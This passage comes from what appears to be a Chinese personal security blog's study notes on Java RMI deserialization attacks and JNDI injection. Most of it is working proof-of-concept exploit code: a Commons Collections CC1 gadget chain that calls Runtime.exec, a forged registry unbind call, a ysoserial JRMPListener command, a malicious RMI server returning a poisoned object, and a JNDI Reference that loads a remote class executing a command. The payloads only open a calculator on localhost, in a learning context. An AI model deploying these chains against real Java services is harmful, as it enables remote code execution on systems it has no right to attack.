class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1(); <span class="comment">// cc1链生成的对象</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance( <span class="comment">// 套上一个动态代理的壳</span></span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,remote); <span class="comment">// 绑定执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rebind同理，直接修改成<code> registry.rebind(&quot;test&quot;,remote);</code>也能弹计算机</p>
<h5 id="unbind-和lookup"><a href="#unbind-和lookup" class="headerlink" title="unbind()和lookup()"></a>unbind()和lookup()</h5><p>这是lookup()和unbind()源码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415225854.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250415225935.png" ></p>
<p>这两个的思路是差不多的，我们看unbind()，unbind()里面只接收string类型的readObject</p>
<p>这里的思路是攻击者模仿<code>RegistryImpl_Stub</code>的流程伪造请求数据，然后网络传输，服务端Skel处理数据，触发反序列化，然后中间涉及反射调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));</span><br><span class="line"></span><br><span class="line"><span class="comment">//        RemoteObject</span></span><br><span class="line">        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); <span class="comment">// 获取RemoteObject所有成员变量</span></span><br><span class="line">        fields_0[<span class="number">0</span>].setAccessible(<span class="literal">true</span>); <span class="comment">// 设置RemoteObject第一个成员变量 也就是 ref</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef) fields_0[<span class="number">0</span>].get(registry); <span class="comment">// 获取ref的值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line"></span><br><span class="line">        Field[] fields_1 = registry.getClass().getDeclaredFields(); <span class="comment">// 获取RegistryImpl_Stub所有成员变量</span></span><br><span class="line">        fields_1[<span class="number">0</span>].setAccessible(<span class="literal">true</span>); <span class="comment">// 设置第一个RegistryImpl_Stub变量也就是Operation</span></span><br><span class="line">        Operation[] operations = (Operation[]) fields_1[<span class="number">0</span>].get(registry); <span class="comment">// 获取Operation的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        伪造RegistryImpl_Stub里面unbind的代码，去伪造传输信息</span></span><br><span class="line"><span class="comment">//        RemoteCall var2 = super.ref.newCall(this, operations, 4, 4905912898345647071L);</span></span><br><span class="line"><span class="comment">//        ObjectOutput var3 = var2.getOutputStream();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var1);</span></span><br><span class="line"><span class="comment">//        super.ref.invoke(var2);</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">4</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">        var3.writeObject(remote);</span><br><span class="line">        ref.invoke(var2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><p>主要是在 <code>unmarshalValue()</code> 那个地方存在入口类</p>
<h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>对注册中心来说，有5个方法可以触发，除了unbind和rebind都会返回数据，返回的都是序列化的格式，所以会有客户端反序列化流程，如果我们控制注册中心给客户端发送的数据是恶意的，就能实现对客户端的攻击，这里直接用链子打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;open -a calculator&#x27;</span><br></pre></td></tr></table></figure>

<p>直接起一个1099服务，然后客户端执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">registry.list()</span><br></pre></td></tr></table></figure>

<p>就会弹计算机</p>
<h5 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h5><h6 id="服务端返回恶意Object"><a href="#服务端返回恶意Object" class="headerlink" title="服务端返回恶意Object"></a>服务端返回恶意Object</h6><p>远程方法调用的时候返回的数据除了String，还可以是Object，如果是Object就会有反序列化流程，所以操作空间在这里，现在伪造一个恶意的服务端，当被客户端调用的时候返回恶意Object</p>
<p>新建一个User接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口实现，里面getUser方法返回一个恶意对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerReturnObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServerReturnObject</span><span class="params">(String name, <span class="type">int</span> age)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端启动，把恶意对象绑定到注册中心</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">liming</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerReturnObject</span>(<span class="string">&quot;flow&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>,liming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;registry is running...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;liming is bind in registry&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端请求恶意方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端打客户端，返回 Object 对象  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EVIlClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User)registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机</p>
<h6 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h6><p>这部分利用条件太苛刻，不细看了</p>
<h4 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h4><p>这块不是很清晰，先略</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>有些地方还不是很清晰，总体就是利用返回数据要反序列化这个点打，或者注册中心的几个方法，看起来有些手法已经过时或者太苛刻了，可学性不高。</p>
<p>匆匆写下这些，其实还不够全，后面再补上，本文内容无法做完知识参考，纯粹个人笔记。如有错误，欢迎指正。</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-jndi注入</title>
    <url>/2025/04/16/Java-jndi%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="JNDI概述"><a href="#JNDI概述" class="headerlink" title="JNDI概述"></a>JNDI概述</h3><h4 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h4><p>JNDI全称Java Naming Diretory Interface ，java名称与目录接口，一个名字对应一个对象。他提供了统一的客户端API，由管理者将JNDI API映射为特定的目录服务和命名服务，为使用者查找和访问资源提供了统一的接口，可以用来的定义用户，网络，机器，对象和服务等各种资源。</p>
<p><strong>命名服务</strong>：一个通过名称查找实际对象的服务</p>
<p><strong>目录服务</strong>：目录服务在命名服务基础上扩展，允许为对象添加属性，支持通过属性组合筛选资源。例如，LDAP中用户对象可包含姓名、邮箱等属性。</p>
<p><strong>SPI</strong>（Service Provider Interface）：即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。</p>
<p>JDK 中包含了下述内置的命名目录服务:</p>
<ul>
<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
<li>LDAP: 轻量级目录访问协议</li>
<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
<li>DNS（域名转换协议）</li>
</ul>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">MyService</span> <span class="variable">service</span> <span class="operator">=</span> (MyService) ctx.lookup(<span class="string">&quot;rmi://server/MyService&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="JNDI攻击"><a href="#JNDI攻击" class="headerlink" title="JNDI攻击"></a>JNDI攻击</h3><h4 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h4><p>在之前RMI项目基础上，客户端和服务端分别新建两个文件</p>
<p>JNDIRMIServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 在本地1099起一个RMI注册中心</span></span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>()); <span class="comment">// 用rebind把RemoteObjImpl实例绑定到RMI的remoteObj</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JNDIRMIClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 创建JNDI的初始上下文</span></span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>); <span class="comment">// 找到这个rmi远程对象</span></span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>)); <span class="comment">// 调用这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能实现远程方法的调用，看起来很RMI很像，主要就是多了<code>InitialContext</code></p>
<h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><p>打个断点在客户端的lookup调试一下，看整个过程</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214159.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214228.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416214302.png" ></p>
<p>流程是<code>InitialContext.lookup()</code>-&gt;<code>GenericURLContext.lookup()</code>-&gt;<code>RegistryContext.lookup()</code>最后在RegistryContext的时候，可以看到<code>this.registry</code>是RegistryImpl_Stub，这个之前已经分析过，所以可以说使用JNDI调用RMI服务的时候，最后还是会走到RMI到逻辑里，使用RMI有的漏洞JNDI也可以打</p>
<h5 id="常见打法jndi-reference"><a href="#常见打法jndi-reference" class="headerlink" title="常见打法jndi reference"></a>常见打法jndi reference</h5><p>jndi注入漏洞，和调用的服务无关，rmi，ldap，dns等都存在这个问题</p>
<p>主要是服务端调用了一个<code>Reference</code>，感觉像套了一层</p>
<p>看一下Reference的构造函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250416231345.png" ></p>
<p>第一个参数是类名，第二个参数是factory工厂（里面有代码逻辑），第三个参数是地址</p>
<p>先写一个恶意类生产class文件，然后在目录起一个http服务，让calc.class文件可以被访问到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后服务端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 正常启动注册中心</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:8000/&quot;</span>); </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>());</span><br></pre></td></tr></table></figure>

<p>现在把<code>new RemoteObjImpl()</code>改成<code>reference</code>，感觉就像一层恶意的壳</p>
<p>现在再运行客户端，就成功弹计算机，再调试一下，看看怎么回事</p>
<p>比较特殊的是进到<code>ResitryContext</code>里面有lookup，出来后下面有个<code>decodeObject()</code>，此时有个var2参数是<code>ReferenceWrapper_Stub</code>类型，是lookup返回的内容，也就是在rmi查询到的对象，但是服务端绑定的是Reference对象</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-16%2023.27.13.png" ></p>
<p>所以会产生这个变化是因为服务端的<code>rebind()</code>，调试看一下，断点打在服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure>

